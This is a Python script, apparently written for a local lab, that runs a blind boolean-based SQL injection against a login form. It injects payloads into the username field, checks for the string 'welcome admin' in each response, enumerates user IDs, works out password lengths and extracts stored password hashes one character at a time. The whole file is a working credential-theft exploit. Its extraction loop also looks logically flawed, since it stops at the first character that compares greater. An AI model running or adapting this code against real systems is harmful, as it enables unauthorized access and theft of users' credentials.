import requests

total_queries = 0
charset = '0123456789abcdef'
#'0123456789abcdef' are being used because data being extracted are hashsums
target = "http://localhost:5000"
needle = "welcome admin"

# perfoming an injected query towards the web and identify from the response whether the request was valid or invalid
def injected_query(payload):
    global total_queries
    r = requests.post(target, data = {"username": f"admin' and {payload}--", "password":"password"})
    total_queries += 1
    return needle not in r.text

# creating a boolean query which identifies at a certain offset whether a character is valid or invalid
def boolean_query(offset, user_id, character, operator=">"):
    payload = f"(select hex(substr(password,{offset+1},1)) from user where id = {user_id}) {operator} hex('{character}')"
    return injected_query(payload)

# exploiting sql injection to see if a user is valid or invalid
def invalid_user(user_id):
    payload = f"(select id from user where id = {user_id}) >= 0"
    return injected_query(payload)

# understanding the length of the user's password
def password_length(user_id):
    i = 0
    while True:
        payload = f"(select length(password) from user where id = {user_id} and length(password) <= {i} limit 1)"
        if not injected_query(payload):
            return i
        i += 1

# extracting the user's hash by iterating over potential characters
def extract_hash(charset, user_id, password_length):
    found = ""
    for i in range(password_length):
        for j in range(len(charset)):
            if boolean_query(i, user_id, charset[j]):
                found += charset[j]
                break
    return found

# creating a function to see how many queries we have performed
def total_queries_taken():
    global total_queries
    print(f"\t\t[!] {total_queries} total queries!")
    total_queries = 0

while True:
    try:
        user_id = input("> Enter a user ID to extract the possible password hash: ")
        if not invalid_user(user_id):
            user_password_length = password_length(user_id)
            print(f"\t[-] User {user_id} hash length: {user_password_length}")
            total_queries_taken()
            hash = extract_hash(charset, user_id, user_password_length)
            print(f"\t[-] User {user_id} hash: {hash}")
            total_queries_taken()
        else:
            print(f"\t[X] Sorry, user {user_id} doesn't exist!")
    except KeyboardInterrupt:
        break
